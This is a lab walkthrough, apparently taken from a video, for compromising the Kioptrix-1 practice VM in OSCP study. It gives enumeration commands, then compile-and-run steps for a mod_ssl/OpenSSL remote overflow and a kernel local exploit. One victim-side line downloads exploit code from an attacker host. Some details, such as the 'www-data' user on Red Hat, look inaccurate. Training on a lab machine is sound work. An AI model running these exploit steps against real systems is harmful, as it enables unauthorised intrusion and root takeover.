This walkthrough focuses on the methodology and commands used to compromise the **Kioptrix-1** virtual machine, providing a structured approach for your OSCP studies. The primary path involves exploiting a legacy vulnerability in the Apache/OpenSSL stack, followed by a local kernel exploit for root.

## Kioptrix-1 Walkthrough: Comprehensive Notes and Commands

-----

### 1\. Initial Setup and Enumeration

The first step is always to identify the target on the network and perform a thorough port and service scan.

#### A. IP Discovery & Environment Variables

To efficiently manage the target IP, set an environment variable.

| Description | Command | Timestamps |
| :--- | :--- | :--- |
| **IP Discovery (Ping Scan)** | `nmap -sn 192.168.1.0/24` (or similar network range) | [[15:43](http://www.youtube.com/watch?v=1CNK0WCdIzE&t=943)] |
| **Set IP Variable** | `export IP=<TARGET_IP>` (e.g., `192.168.1.104`) | [[16:20](http://www.youtube.com/watch?v=1CNK0WCdIzE&t=980)] |

#### B. Full Port and Service Scan

A deep scan is necessary to identify vulnerable versions of software.

| Description | Command | Key Findings | Timestamps |
| :--- | :--- | :--- | :--- |
| **Aggressive Nmap Scan** | `nmap -p- -sV -sT -A $IP --open` | **Open Ports:** 22 (SSH), 80 (HTTP), **139 (NetBIOS/Samba)**, **443 (HTTPS/SSL)**, 32768 (RPC) | [[26:48](http://www.youtube.com/watch?v=1CNK0WCdIzE&t=1608)] |
| **Vulnerable Service** | N/A | **Apache httpd 1.3.20** on Red Hat Linux with **OpenSSL 0.9.6b** (highly vulnerable to SSL attacks) and **Mod SSL 2.8.4** | [[33:00](http://www.youtube.com/watch?v=1CNK0WCdIzE&t=1980)] - [[34:50](http://www.youtube.com/watch?v=1CNK0WCdIzE&t=2090)] |

-----

### 2\. Service-Specific Enumeration

Focusing on the exposed services to find initial vectors.

#### A. Web Server Enumeration (Port 80/443)

Directory busting reveals interesting paths, including a critical configuration detail.

| Description | Command | Key Findings | Timestamps |
| :--- | :--- | :--- | :--- |
| **Directory Busting** | `gobuster dir -u http://$IP -w <WORDLIST> -t 30` | Found `/usage` directory, which is a critical finding on old Apache versions. | [[39:50](http://www.youtube.com/watch?v=1CNK0WCdIzE&t=2390)] |
| **Web Access Log** | Manually navigating to `http://$IP/usage/` | Exposes the web server's access logs, which can reveal endpoints not found through passive directory busting. | [[44:03](http://www.youtube.com/watch?v=1CNK0WCdIzE&t=2643)] |

#### B. SMB/NetBIOS Enumeration (Port 139)

Checking the Samba service for misconfigurations, such as allowing null sessions.

| Description | Command | Key Findings | Timestamps |
| :--- | :--- | :--- | :--- |
| **Samba Enumeration** | `enum4linux -a $IP` | Confirms an **SMB Null Session** is permitted. Shares: `IPC$` and `ADMIN$`. | [[47:34](http://www.youtube.com/watch?v=1CNK0WCdIzE&t=2854)] - [[50:24](http://www.youtube.com/watch?v=1CNK0WCdIzE&t=3024)] |

-----

### 3\. Initial Exploitation (Gaining a Low-Privilege Shell)

The critical vulnerability is the outdated OpenSSL/Mod SSL service on port 443.

| Description | Command/Action | Target Selection | Timestamps |
| :--- | :--- | :--- | :--- |
| **Search ExploitDB** | `searchsploit mod ssl 2.8.4` | Identifies **Exploit-DB ID 47080** (Apache mod\_ssl/OpenSSL 0.9.6 Multiple Remote Overflows). | [[55:10](http://www.youtube.com/watch?v=1CNK0WCdIzE&t=3310)] |
| **Download & Compile** | 1. `searchsploit -m 47080` (get 47080.c) <br> 2. `gcc 47080.c -o offsec -l crypto` | The `-l crypto` flag links the necessary OpenSSL library for compilation. | [[55:52](http://www.youtube.com/watch?v=1CNK0WCdIzE&t=3352)] - [[57:23](http://www.youtube.com/watch?v=1CNK0WCdIzE&t=3443)] |
| **Execute Exploit** | `./offsec 0x6a $IP 443 -c 50` | **`0x6a`** is the target identifier that matches **Apache 1.3.20 Red Hat Linux**. This successfully drops a shell as the low-privilege user `www-data`. | [[59:17](http://www.youtube.com/watch?v=1CNK0WCdIzE&t=3557)] - [[01:02:04](http://www.youtube.com/watch?v=1CNK0WCdIzE&t=3724)] |

-----

### 4\. Privilege Escalation (Gaining Root)

Once on the machine, the priority is to find a way to elevate privileges from `www-data` to `root`.

#### A. System Enumeration

Gathering operating system and kernel information is vital for finding a suitable local exploit.

| Description | Command | Key Findings | Timestamps |
| :--- | :--- | :--- | :--- |
| **Kernel Info** | `uname -a` | **Linux Kioptrix Level 1 2.4.7-10** (Old Kernel) | [[01:05:46](http://www.youtube.com/watch?v=1CNK0WCdIzE&t=3946)] |
| **OS Info** | `cat /etc/*release` | **Red Hat Linux Release 7.2 (Enigma)** (Old OS) | [[01:06:01](http://www.youtube.com/watch?v=1CNK0WCdIzE&t=3961)] |
| **SUID Binaries** | `find / -perm -4000 -print 2>/dev/null` | Lists binaries that run with the owner's permission (e.g., root). The presence of any binary with an unpatched local vulnerability can lead to root. | [[01:07:48](http://www.youtube.com/watch?v=1CNK0WCdIzE&t=4068)] |

#### B. Final Kernel Exploitation

The combination of an old kernel and a specific Red Hat version suggests an unpatched local exploit.

| Description | Command/Action | Exploit Name | Timestamps |
| :--- | :--- | :--- | :--- |
| **Search ExploitDB** | `searchsploit linux 2.4.7 red hat` | Identifies **Exploit-DB ID 3** (Linux kernel 2.4.7 - 2.4.9/2.4.17 **P-Trace/k-mod** exploit). | [[01:13:09](http://www.youtube.com/watch?v=1CNK0WCdIzE&t=4389)] - [[01:13:39](http://www.youtube.com/watch?v=1CNK0WCdIzE&t=4419)] |
| **Transfer Exploit** | On Kali: `python3 -m http.server 8000` <br> On Victim: `wget http://<ATTACKER_IP>:8000/3.c` | Uses a simple HTTP server to transfer the C exploit file to a writable directory on the victim. | [[01:13:56](http://www.youtube.com/watch?v=1CNK0WCdIzE&t=4436)] |
| **Compile & Execute** | 1. `gcc 3.c -o offsec` <br> 2. `./offsec` | Execution of the compiled exploit is successful, granting a **root shell (`#`)**. | [[01:14:23](http://www.youtube.com/watch?v=1CNK0WCdIzE&t=4463)] - [[01:15:06](http://www.youtube.com/watch?v=1CNK0WCdIzE&t=4506)] |
http://googleusercontent.com/youtube_content/0